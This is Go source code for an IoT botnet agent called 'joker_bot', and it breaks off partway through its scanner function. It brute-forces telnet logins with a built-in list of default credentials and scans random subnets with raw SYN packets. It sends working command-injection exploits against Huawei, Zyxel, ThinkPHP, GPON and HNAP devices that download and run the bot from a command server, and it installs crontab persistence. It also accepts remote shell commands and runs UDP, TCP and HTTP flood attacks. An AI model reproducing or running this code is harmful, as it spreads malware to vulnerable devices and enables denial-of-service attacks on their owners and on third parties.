package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	AGENT_VERSION    = "3.0.0"
	DEFAULT_C2_HOST  = "0.0.0.0"
	DEFAULT_C2_PORT  = 9001
	HB_MIN           = 45
	HB_MAX           = 100
	RECONNECT_DELAY  = 60
	SCAN_THREADS     = 256
	CONNECT_TIMEOUT  = 150 * time.Millisecond
	TELNET_TIMEOUT   = 2 * time.Second
	DEPLOY_TIMEOUT   = 15 * time.Second
)

var (
	botnetSecretKey = make([]byte, 32)
	lcgState        uint32
	lcgMu           sync.Mutex
)

type C2Command struct {
	Type       string      `json:"type"`
	ID         string      `json:"id"`
	CommandType string     `json:"command_type"`
	FloodType  string      `json:"flood_type"`
	TargetIP   string      `json:"target_ip"`
	TargetPort int         `json:"target_port"`
	Duration    int        `json:"duration"`
	Threads     int        `json:"threads"`
	Ports       []int      `json:"ports"`
	Command     string     `json:"command"`
	AgentID     string     `json:"agent_id"`
}

type C2Response struct {
	Type string `json:"type"`
	ID   string `json:"id"`
	Output string `json:"output"`
}

func getString(m map[string]interface{}, key string) string {
	v, ok := m[key]
	if !ok {
		return ""
	}
	s, ok := v.(string)
	if !ok {
		return ""
	}
	return s
}

func getInt(m map[string]interface{}, key string, def int) int {
	v, ok := m[key]
	if !ok {
		return def
	}
	switch n := v.(type) {
	case float64:
		return int(n)
	case int:
		return n
	case int64:
		return int(n)
	default:
		if s, ok := v.(string); ok {
			var result int
			_, err := fmt.Sscanf(s, "%d", &result)
			if err == nil {
				return result
			}
		}
		return def
	}
}

type cred struct {
	username string
	password string
	weight   int
}

var weightedCreds = []cred{
	{"root", "root", 8}, {"admin", "admin", 8}, {"root", "12345", 6}, {"root", "1234", 6},
	{"root", "123456", 6}, {"root", "admin", 5}, {"root", "1234567890", 5}, {"root", "12345678", 5},
	{"root", "123456789", 4}, {"root", "password", 5}, {"root", "8888", 4}, {"root", "0000", 4},
	{"root", "1111", 4}, {"root", "111111", 4}, {"admin", "123456", 5}, {"admin", "1234", 5},
	{"admin", "password", 5}, {"admin", "admin1234", 4}, {"admin", "12345678", 3},
	{"root", "pass", 3}, {"root", "ubnt", 3}, {"root", "tplink", 3}, {"root", "netgear", 3},
	{"root", "vizio", 3}, {"root", "zte9x", 3}, {"root", "v202", 2}, {"root", "v22wat", 2},
	{"root", "CMMC", 2}, {"root", "CTWLAN", 2}, {"root", "telnet23", 2}, {"root", "changeme", 3},
	{"root", "abc123", 3}, {"root", "letmein", 3}, {"root", "welcome", 3}, {"root", "qwerty", 3},
	{"root", "password1234", 2}, {"root", "admin123", 2}, {"root", "default123", 2},
	{"root", "00000000", 2}, {"root", "0000000", 2}, {"root", "123456789a", 2},
	{"root", "pass1234", 2}, {"root", "1234567a", 2}, {"root", "12345a", 2},
	{"support", "support", 6}, {"user", "user", 6}, {"default", "default", 4},
	{"guest", "guest", 4}, {"ubnt", "ubnt", 3}, {"hi3518", "hi3518", 2}, {"bin", "bin", 2},
}

func buildCredList() []cred {
	var list []cred
	for _, c := range weightedCreds {
		for i := 0; i < c.weight; i++ {
			list = append(list, c)
		}
	}
	return list
}

var allCreds = buildCredList()

type ScanHit struct {
	IP   string
	Port uint16
	Type string
}

type ScanStats struct {
	scanned   int64
	found     int64
	deployed  int64
}

var stats ScanStats

var hitListSubnets = []struct{ o1, o2 byte }{
	{1, 1}, {1, 192}, {1, 200}, {14, 135}, {14, 140}, {14, 141}, {14, 208},
	{27, 25}, {27, 26}, {36, 248}, {36, 249}, {36, 250}, {36, 251}, {36, 252}, {36, 253}, {36, 254}, {36, 255},
	{58, 0}, {58, 32}, {58, 60}, {58, 96}, {58, 97}, {58, 99}, {58, 140}, {58, 141},
	{58, 144}, {58, 148}, {58, 150}, {58, 154}, {58, 156}, {58, 160}, {58, 162},
	{58, 164}, {58, 165}, {58, 166}, {58, 167}, {58, 168}, {58, 169}, {58, 170},
	{110, 8}, {110, 9}, {110, 10}, {110, 11}, {110, 12}, {110, 13}, {110, 14}, {110, 15},
	{110, 16}, {110, 17}, {110, 18}, {110, 19}, {110, 20}, {111, 64}, {111, 128},
	{112, 0}, {112, 1}, {112, 16}, {112, 17}, {112, 32}, {112, 33}, {112, 48}, {112, 49},
	{114, 0}, {114, 1}, {114, 64}, {114, 65}, {114, 96}, {114, 97},
	{118, 0}, {118, 64}, {119, 0}, {119, 32}, {119, 96}, {119, 128},
	{113, 160}, {113, 161}, {113, 162}, {113, 163}, {113, 164}, {113, 165},
	{122, 0}, {122, 1}, {122, 16}, {122, 17}, {122, 32}, {122, 33},
	{126, 0}, {126, 1}, {126, 16}, {126, 17}, {126, 32}, {126, 33},
	{23, 0}, {23, 1}, {23, 2}, {23, 3}, {23, 4}, {23, 5}, {23, 6}, {23, 7},
	{47, 0}, {47, 1}, {47, 2}, {47, 3}, {47, 4}, {47, 5}, {47, 6}, {47, 7},
	{65, 0}, {65, 128}, {66, 128}, {66, 192}, {67, 64}, {68, 0}, {68, 64},
	{69, 0}, {69, 60}, {69, 70}, {69, 160}, {69, 172}, {69, 174}, {69, 180},
	{70, 0}, {70, 32}, {71, 0}, {71, 4}, {72, 0}, {72, 22}, {73, 0}, {73, 16},
	{74, 0}, {74, 200}, {75, 0}, {75, 100}, {80, 0}, {80, 80}, {81, 0}, {81, 50},
	{82, 0}, {82, 208}, {83, 0}, {85, 0}, {85, 176}, {87, 0}, {88, 0}, {89, 0},
	{77, 0}, {77, 64}, {77, 128}, {77, 192}, {78, 0}, {78, 64}, {78, 128}, {78, 192},
	{79, 0}, {79, 64}, {79, 128}, {79, 192}, {80, 0}, {80, 64}, {80, 128}, {80, 192},
	{81, 0}, {81, 64}, {81, 128}, {81, 192}, {82, 0}, {82, 64}, {82, 128}, {82, 192},
	{83, 0}, {83, 64}, {83, 128}, {83, 192}, {84, 0}, {84, 64}, {84, 128}, {84, 192},
	{85, 0}, {85, 64}, {85, 128}, {85, 192}, {86, 0}, {86, 64}, {86, 128}, {86, 192},
	{87, 0}, {87, 64}, {87, 128}, {87, 192}, {88, 0}, {88, 64}, {88, 128}, {88, 192},
	{89, 0}, {89, 64}, {89, 128}, {89, 192}, {90, 0}, {90, 64}, {90, 128}, {90, 192},
	{91, 0}, {91, 64}, {91, 128}, {91, 192},
	{103, 4}, {103, 8}, {103, 16}, {103, 100}, {103, 101}, {103, 102},
	{104, 16}, {104, 24}, {104, 32}, {104, 48}, {104, 192},
	{107, 32}, {107, 64}, {107, 96}, {107, 128}, {107, 160}, {107, 192},
	{108, 0}, {108, 64}, {108, 128}, {108, 192},
	{177, 0}, {177, 32}, {177, 64}, {177, 96}, {177, 128}, {177, 160}, {177, 192},
	{189, 0}, {189, 32}, {189, 64}, {189, 96}, {189, 128}, {189, 160}, {189, 192},
	{31, 184}, {31, 186}, {31, 187}, {31, 189}, {37, 77}, {37, 78},
	{37, 79}, {37, 81}, {37, 82}, {37, 83}, {37, 84}, {37, 86}, {37, 98},
	{37, 99}, {37, 102}, {37, 104}, {37, 106}, {37, 107}, {37, 112}, {37, 113},
	{37, 114}, {37, 115}, {37, 122}, {37, 123}, {37, 136}, {37, 137}, {37, 138},
	{37, 139}, {37, 141}, {37, 144}, {37, 146}, {37, 150}, {37, 168}, {37, 171},
	{37, 172}, {37, 173}, {37, 174}, {37, 175}, {37, 176},
}

func lcgNext() uint32 {
	lcgMu.Lock()
	defer lcgMu.Unlock()
	lcgState = lcgState*1664525 + 1013904223
	return lcgState
}

func isBogon(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return true
	}
	o1, err := strconv.Atoi(parts[0])
	if err != nil {
		return true
	}
	o2, _ := strconv.Atoi(parts[1])
	o3, _ := strconv.Atoi(parts[2])

	if o1 == 0 { return true }
	if o1 == 10 { return true }
	if o1 == 127 { return true }
	if o1 == 169 && o2 == 254 { return true }
	if o1 == 172 && o2 >= 16 && o2 <= 31 { return true }
	if o1 == 100 && o2 >= 64 && o2 <= 127 { return true }
	if o1 == 192 && o2 == 0 && o3 < 255 { return true }
	if o1 == 192 && o2 == 0 && o3 == 2 { return true }
	if o1 == 192 && o2 == 88 && o3 == 99 { return true }
	if o1 == 192 && o2 == 168 { return true }
	if o1 == 198 && o2 >= 18 && o2 <= 19 { return true }
	if o1 == 198 && o2 == 51 && o3 == 100 { return true }
	if o1 == 203 && o2 == 0 && o3 == 113 { return true }
	if o1 >= 224 { return true }
	return false
}

func isHoneypot(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return true
	}
	o1, err := strconv.Atoi(parts[0])
	if err != nil {
		return true
	}
	if o1 == 3 || o1 == 6 || o1 == 7 || o1 == 11 || o1 == 15 || o1 == 16 ||
		o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 30 || o1 == 33 ||
		o1 == 55 || o1 == 214 || o1 == 215 {
		return true
	}
	if o1 < 1 || o1 > 223 {
		return true
	}
	return false
}

func generateRandomIP() string {
	for {
		idx := int(lcgNext() % uint32(len(hitListSubnets)))
		subnet := hitListSubnets[idx]
		host1 := byte(lcgNext() >> 24)
		host2 := byte(lcgNext() >> 24)
		ip := fmt.Sprintf("%d.%d.%d.%d", subnet.o1, subnet.o2, host1, host2)
		if !isBogon(ip) && !isHoneypot(ip) {
			return ip
		}
	}
}

func computeISN(ip net.IP, port uint16) uint32 {
	ip4 := ip.To4()
	h := sha256.New()
	h.Write(ip4)
	h.Write(botnetSecretKey)
	var portBuf [2]byte
	binary.BigEndian.PutUint16(portBuf[:], port)
	h.Write(portBuf[:])
	sum := h.Sum(nil)
	return binary.BigEndian.Uint32(sum[:4])
}

type RawSocket struct {
	fd      uintptr
	srcIP   [4]byte
}

func createRawSocket() (*RawSocket, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		return nil, fmt.Errorf("raw socket creation failed: %v", err)
	}
	if err := syscall.SetNonblock(fd, true); err != nil {
		syscall.Close(fd)
		return nil, fmt.Errorf("setnonblock failed: %v", err)
	}

	localIP := getLocalIP()
	return &RawSocket{fd: uintptr(fd), srcIP: localIP}, nil
}

func getLocalIP() [4]byte {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return [4]byte{0, 0, 0, 0}
	}
	defer conn.Close()
	addr := conn.LocalAddr().(*net.UDPAddr)
	return [4]byte{addr.IP[0], addr.IP[1], addr.IP[2], addr.IP[3]}
}

func tcpChecksum(srcIP, dstIP [4]byte, tcpHdr []byte) uint16 {
	var pseudo []byte
	pseudo = append(pseudo, srcIP[:]...)
	pseudo = append(pseudo, dstIP[:]...)
	pseudo = append(pseudo, 0)
	pseudo = append(pseudo, syscall.IPPROTO_TCP)
	plen := uint16(len(tcpHdr))
	pseudo = append(pseudo, byte(plen>>8), byte(plen&0xFF))
	pseudo = append(pseudo, tcpHdr...)

	var sum uint32
	for i := 0; i+1 < len(pseudo); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(pseudo[i : i+2]))
	}
	if len(pseudo)%2 == 1 {
		sum += uint32(pseudo[len(pseudo)-1])
	}
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	return ^uint16(sum)
}

func (s *RawSocket) sendRawSYN(dstIP net.IP, dstPort uint16) {
	dst4 := dstIP.To4()
	var dst [4]byte
	copy(dst[:], dst4)

	isn := computeISN(dstIP, dstPort)
	srcPort := uint16(rand.Intn(60000) + 1024)

	tcpHdr := make([]byte, 20)
	binary.BigEndian.PutUint16(tcpHdr[0:2], srcPort)
	binary.BigEndian.PutUint16(tcpHdr[2:4], dstPort)
	binary.BigEndian.PutUint32(tcpHdr[4:8], isn)
	binary.BigEndian.PutUint32(tcpHdr[8:12], 0)
	tcpHdr[12] = 0x50
	tcpHdr[13] = 0x02
	binary.BigEndian.PutUint16(tcpHdr[14:16], 64000)
	cs := tcpChecksum(s.srcIP, dst, tcpHdr)
	binary.BigEndian.PutUint16(tcpHdr[16:18], cs)
	tcpHdr[18] = 0x20
	tcpHdr[19] = 0x00

	addr := &syscall.SockaddrInet4{Addr: dst}
	_ = syscall.Sendto(rawFD(s.fd), tcpHdr, 0, addr)
}

func (s *RawSocket) readPacket() (net.IP, uint16, uint32, uint32, bool) {
	buf := make([]byte, 65535)
	n, _, err := syscall.Recvfrom(rawFD(s.fd), buf, 0)
	if err != nil {
		return nil, 0, 0, 0, false
	}
	if n < 40 {
		return nil, 0, 0, 0, false
	}

	ipHdr := buf[:20]
	if ipHdr[0]>>4 != 4 {
		return nil, 0, 0, 0, false
	}
	ihl := int(ipHdr[0] & 0x0F)
	if ihl < 5 {
		return nil, 0, 0, 0, false
	}
	proto := ipHdr[9]
	if proto != 6 {
		return nil, 0, 0, 0, false
	}

	tcpStart := ihl * 4
	tcpHdr := buf[tcpStart : tcpStart+20]
	dstPort := binary.BigEndian.Uint16(tcpHdr[2:4])
	flags := tcpHdr[13]
	if flags&0x12 != 0x12 {
		return nil, 0, 0, 0, false
	}
	if flags&0x04 != 0 {
		return nil, 0, 0, 0, false
	}
	seq := binary.BigEndian.Uint32(tcpHdr[4:8])
	ack := binary.BigEndian.Uint32(tcpHdr[8:12])

	srcIP := net.IP(buf[12:16])
	return srcIP, dstPort, seq, ack, true
}

func (s *RawSocket) Close() {
	syscall.Close(rawFD(s.fd))
}

func lcgLoop() {
	if lcgState == 0 {
		lcgState = uint32(time.Now().UnixNano())
	}
}

func scannerWorker(raw *RawSocket, stopChan chan struct{}, scanDone chan struct{}, c2Host string, c2Port int) {
	defer func() { scanDone <- struct{}{} }()
	lcgLoop()
	for {
		select {
		case <-stopChan:
			return
		default:
		}
		ip := generateRandomIP()
		atomic.AddInt64(&stats.scanned, 1)
		ipParsed := net.ParseIP(ip)
		for _, port := range []uint16{23, 2323, 80, 8080, 37215} {
			raw.sendRawSYN(ipParsed, port)
		}
		time.Sleep(333 * time.Millisecond)
	}
}

func synReceiver(raw *RawSocket, stopChan chan struct{}, scanDone chan struct{}, c2Host string, c2Port int) {
	defer func() { scanDone <- struct{}{} }()
	for {
		select {
		case <-stopChan:
			return
		default:
		}
		srcIP, dstPort, _, ack, ok := raw.readPacket()
		if !ok {
			time.Sleep(10 * time.Millisecond)
			continue
		}
		expectedISN := computeISN(srcIP, dstPort)
		if ack != expectedISN+1 {
			continue
		}
		atomic.AddInt64(&stats.found, 1)
		go handleOpenPort(srcIP.String(), int(dstPort), c2Host, c2Port, getArch())
	}
}

func scannerWorkerConnect(stopChan chan struct{}, scanDone chan struct{}, c2Host string, c2Port int, arch string) {
	defer func() { scanDone <- struct{}{} }()
	lcgLoop()
	for {
		select {
		case <-stopChan:
			return
		default:
		}
		ip := generateRandomIP()
		atomic.AddInt64(&stats.scanned, 1)
		for _, port := range []int{23, 2323, 80, 8080, 37215} {
			if isPortOpen(ip, port) {
				atomic.AddInt64(&stats.found, 1)
				go handleOpenPort(ip, port, c2Host, c2Port, getArch())
			}
		}
		time.Sleep(333 * time.Millisecond)
	}
}

func isPortOpen(ip string, port int) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), CONNECT_TIMEOUT)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func consumeIACs(conn net.Conn) (string, bool) {
	conn.SetReadDeadline(time.Now().Add(TELNET_TIMEOUT))
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		return "", false
	}
	data := buf[:n]
	result := make([]byte, 0, len(data))
	i := 0
	for i < len(data) {
		if data[i] == 0xff && i+1 < len(data) {
			cmd := data[i+1]
			if cmd == 0xfb || cmd == 0xfc || cmd == 0xfd || cmd == 0xfe {
				if i+2 < len(data) {
					i += 3
				} else {
					i += 2
				}
				continue
			}
			if cmd == 0xff {
				i += 2
				continue
			}
		}
		result = append(result, data[i])
		i++
	}
	return string(result), true
}

func isLoginPrompt(text string) bool {
	tl := strings.ToLower(text)
	return strings.Contains(tl, "login:") || strings.Contains(tl, "username:") ||
		strings.Contains(tl, "user:") || strings.Contains(tl, "ogin:")
}

func isAuthFailure(text string) bool {
	tl := strings.ToLower(text)
	return strings.Contains(tl, "incorrect") || strings.Contains(tl, "failed") ||
		strings.Contains(tl, "denied") || strings.Contains(tl, "invalid") ||
		strings.Contains(tl, "wrong") || strings.Contains(tl, "bad")
}

func isAuthSuccess(text string) bool {
	tl := strings.ToLower(text)
	return strings.Contains(tl, "#") || strings.Contains(tl, "$") ||
		strings.Contains(tl, ">") || strings.Contains(tl, "busybox") ||
		strings.Contains(tl, "welcome") || strings.Contains(tl, "shell") ||
		strings.Contains(tl, "sh:")
}

func escalateTelnet(conn net.Conn) {
	for _, cmd := range []string{"enable\r\n", "system\r\n", "shell\r\n", "sh\r\n"} {
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		conn.Write([]byte(cmd))
		time.Sleep(300 * time.Millisecond)
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		consumeIACs(conn)
	}
}

func tryLogin(targetIP string, port int, username, password string) (net.Conn, bool) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, port), 5*time.Second)
	if err != nil {
		return nil, false
	}

	conn.SetReadDeadline(time.Now().Add(TELNET_TIMEOUT))
	banner, ok := consumeIACs(conn)
	if !ok {
		banner = ""
	}
	if banner != "" && !isLoginPrompt(banner) {
		conn.Write([]byte("\r\n"))
		time.Sleep(200 * time.Millisecond)
		conn.SetReadDeadline(time.Now().Add(TELNET_TIMEOUT))
		banner, _ = consumeIACs(conn)
	}
	if banner == "" || !isLoginPrompt(banner) {
		conn.Close()
		return nil, false
	}

	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(username + "\r\n"))
	time.Sleep(100 * time.Millisecond)
	conn.Write([]byte(password + "\r\n"))
	time.Sleep(200 * time.Millisecond)

	conn.SetReadDeadline(time.Now().Add(TELNET_TIMEOUT))
	resp, ok := consumeIACs(conn)
	if !ok {
		conn.Close()
		return nil, false
	}
	if isAuthFailure(resp) {
		conn.Close()
		return nil, false
	}
	if isAuthSuccess(resp) || len(strings.TrimSpace(resp)) == 0 {
		escalateTelnet(conn)
		return conn, true
	}
	conn.Close()
	return nil, false
}

func buildDeployCmd(c2Host string, c2Port int, arch string) string {
	return fmt.Sprintf(
		"nohup sh -c 'wget -q http://%s:%d/agent/%s -O /tmp/.joker_bot 2>/dev/null || "+
			"curl -s http://%s:%d/agent/%s -o /tmp/.joker_bot 2>/dev/null; "+
			"chmod 777 /tmp/.joker_bot; "+
			"(crontab -l 2>/dev/null; echo '@reboot /tmp/.joker_bot --install &') | crontab -; "+
			"nohup /tmp/.joker_bot %s %d --install --cascade >/dev/null 2>&1 &' &\r\n",
		c2Host, c2Port, arch, c2Host, c2Port, arch, c2Host, c2Port)
}

func deploySelfTelnet(ip string, port int, username, password, c2Host string, c2Port int, arch string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(DEPLOY_TIMEOUT))

	banner, ok := consumeIACs(conn)
	if !ok || (banner != "" && !isLoginPrompt(banner)) {
		conn.Write([]byte("\r\n"))
		time.Sleep(300 * time.Millisecond)
		banner, _ = consumeIACs(conn)
	}
	if banner == "" || !isLoginPrompt(banner) {
		return
	}

	conn.Write([]byte(username + "\r\n"))
	time.Sleep(200 * time.Millisecond)
	conn.Write([]byte(password + "\r\n"))
	time.Sleep(300 * time.Millisecond)

	resp, _ := consumeIACs(conn)
	if isAuthFailure(resp) {
		return
	}

	escalateTelnet(conn)

	deployCmd := buildDeployCmd(c2Host, c2Port, arch)
	conn.Write([]byte(deployCmd))
	time.Sleep(3 * time.Second)

	atomic.AddInt64(&stats.deployed, 1)
	fmt.Printf("[BOT] DEPLOYED >> %s:%d %s:%s\n", ip, port, username, password)
}

func tryHuaweiExploit(ip string, c2Host string, c2Port int, arch string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:37215", ip), time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g %s -l /tmp/.bot -r /%s; /bin/busybox chmod 777 /tmp/.bot; /tmp/.bot %s)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
	payload = fmt.Sprintf(payload, c2Host, arch, arch)
	conn.SetWriteDeadline(time.Now().Add(time.Second))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
}

func tryZyxelExploit(ip string, c2Host string, c2Port int, arch string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:8080", ip), 500*time.Millisecond)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := "POST /cgi-bin/ViewLog.asc HTTP/1.1\r\nHost: " + ip + "\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: python-requests/2.20.0\r\nContent-Length: 227\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n /bin/busybox wget http://%s:%d/agent/%s -O /tmp/.bot; chmod 777 /tmp/.bot; /tmp/.bot %s %d &\r\n"
	payload = fmt.Sprintf(payload, c2Host, c2Port, arch, arch, c2Host, c2Port)
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
}

func tryThinkPHPExploit(ip string, c2Host string, c2Port int, arch string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:80", ip), 500*time.Millisecond)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://%s:%d/agent/%s -O /tmp/.bot && chmod 777 /tmp/.bot && /tmp/.bot %s %d &' HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Uirusu/2.0\r\n\r\n"
	payload = fmt.Sprintf(payload, c2Host, c2Port, arch, arch, c2Host, c2Port)
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
}

func tryGpon80Exploit(ip string, c2Host string, c2Port int, arch string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:80", ip), 500*time.Millisecond)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := "GET /GponForm/diag_Form?script/%3C%25+echo+shell_exec%28\"cd+/tmp%3Bwget+http://%s:%d/agent/%s+%22%29+--%3E&port=80&host=google.com HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
	payload = fmt.Sprintf(payload, c2Host, c2Port, arch)
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
}

func tryHnapExploit(ip string, c2Host string, c2Port int, arch string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:80", ip), 500*time.Millisecond)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := "POST /HNAP1 HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: 700\r\nSOAPAction: \"http://hapextern/SetupWANIPConnection\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:AddAnyPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewStatusURL>$(cd /tmp; wget http://%s:%d/agent/%s -O /tmp/.bot; chmod 777 /tmp/.bot; nohup /tmp/.bot %s %d --install --cascade &gt;/dev/null 2>&1 &)</NewStatusURL><NewExternalPort>1</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>1</NewInternalPort><NewInternalClient>0.0.0.0</NewInternalClient></u:AddAnyPortMapping></s:Body></s:Envelope>\r\n\r\n"
	payload = fmt.Sprintf(payload, c2Host, c2Port, arch, arch, c2Host, c2Port)
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
}

func handleOpenPort(ip string, port int, c2Host string, c2Port int, arch string) {
	fmt.Printf("[BOT] HIT >> %s:%d\n", ip, port)
	switch port {
	case 23, 2323:
		for _, c := range allCreds {
			if conn, ok := tryLogin(ip, port, c.username, c.password); ok {
				fmt.Printf("[BOT] FOUND >> %s:%d %s:%s\n", ip, port, c.username, c.password)
				go deploySelfTelnet(ip, port, c.username, c.password, c2Host, c2Port, arch)
				conn.Close()
				return
			}
		}
	case 80:
		go tryThinkPHPExploit(ip, c2Host, c2Port, arch)
		go tryGpon80Exploit(ip, c2Host, c2Port, arch)
		go tryHnapExploit(ip, c2Host, c2Port, arch)
	case 8080:
		go tryZyxelExploit(ip, c2Host, c2Port, arch)
	case 37215:
		go tryHuaweiExploit(ip, c2Host, c2Port, arch)
	}
}

func installPersistence() {
	agentPath := "/tmp/.joker_bot"
	home := os.Getenv("HOME")
	if home == "" {
		home = "/root"
	}
	agentDir := home + "/.iot_agent"
	os.MkdirAll(agentDir, 0755)

	if _, err := os.Stat(agentPath); err != nil {
		execPath, err := os.Executable()
		if err == nil {
			data, err := os.ReadFile(execPath)
			if err == nil {
				os.WriteFile(agentDir+"/bot", data, 0755)
				os.WriteFile(agentPath, data, 0755)
			}
		}
	}

	if os.Getuid() == 0 {
		cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s %s %d --install &') | crontab -", agentPath, c2Host, c2Port))
		cmd.Start()
		cmd = exec.Command("sh", "-c", fmt.Sprintf("cp %s /etc/.joker_bot 2>/dev/null", agentPath))
		cmd.Start()
	}
}

var c2Host string
var c2Port int
var scannerActive int32
var scanStopChan chan struct{}

func handleCommand(cmd C2Command) C2Response {
	resp := C2Response{Type: "result", ID: cmd.ID}

	switch cmd.CommandType {
	case "propagate":
		if atomic.LoadInt32(&scannerActive) == 1 {
			resp.Output = "Propagation already active"
			return resp
		}
		atomic.StoreInt32(&scannerActive, 1)
		scanStopChan = make(chan struct{})
		go runScanner(cmd.Threads)
		resp.Output = fmt.Sprintf("Propagation started on %d threads", cmd.Threads)
		return resp

	case "stop":
		if scanStopChan != nil {
			close(scanStopChan)
			scanStopChan = nil
		}
		atomic.StoreInt32(&scannerActive, 0)
		resp.Output = "Stopped all scanning"
		return resp

	case "exec":
		out, err := exec.Command("sh", "-c", cmd.Command).Output()
		if err != nil {
			resp.Output = fmt.Sprintf("Error: %v", err)
		} else {
			resp.Output = string(out)
		}
		return resp

	case "flood":
		resp.Output = fmt.Sprintf("Flood %s -> %s:%d for %ds", cmd.FloodType, cmd.TargetIP, cmd.TargetPort, cmd.Duration)
		go executeFlood(cmd)
		return resp

	case "ping":
		resp.Output = "pong"
		return resp

	case "sysinfo":
		info := map[string]string{
			"hostname": getHostname(),
			"platform": "linux",
			"arch":     getArch(),
			"version":  AGENT_VERSION,
		}
		b, _ := json.Marshal(info)
		resp.Output = string(b)
		return resp

	default:
		resp.Output = fmt.Sprintf("Unknown command: %s", cmd.CommandType)
		return resp
	}
}

func getHostname() string {
	hn, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hn
}

func getArch() string {
	return runtime.GOARCH
}

func executeFlood(cmd C2Command) {
	target := net.JoinHostPort(cmd.TargetIP, strconv.Itoa(cmd.TargetPort))
	endTime := time.Now().Add(time.Duration(cmd.Duration) * time.Second)
	var wg sync.WaitGroup

	switch cmd.FloodType {
	case "udp":
		for time.Now().Before(endTime) {
			s, err := net.Dial("udp", target)
			if err == nil {
				s.Write(make([]byte, 1024))
				s.Close()
			}
		}
	case "tcp":
		for time.Now().Before(endTime) {
			s, err := net.Dial("tcp", target)
			if err == nil {
				s.Write([]byte("POST / HTTP/1.1\r\n\r\n"))
				s.Close()
			}
		}
	case "http_get":
		for time.Now().Before(endTime) {
			conn, err := net.Dial("tcp", target)
			if err == nil {
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + cmd.TargetIP + "\r\n\r\n"))
				conn.Close()
			}
		}
	case "std":
		for time.Now().Before(endTime) {
			conn, err := net.Dial("tcp", target)
			if err == nil {
				conn.Write([]byte("POST / HTTP/1.1\r\nHost: " + cmd.TargetIP + "\r\nContent-Length: 1024\r\n\r\n"))
				conn.Write(make([]byte, 1024))
				conn.Close()
			}
		}
	}
	wg.Wait()
}

func runScanner(threads int) {
	raw, rawErr := createRawSocket()
	useRaw := rawErr == nil

	if !useRaw {
		fmt.Printf("[BOT] Raw socket failed (%v), falling back to connect scanning\n", rawErr)
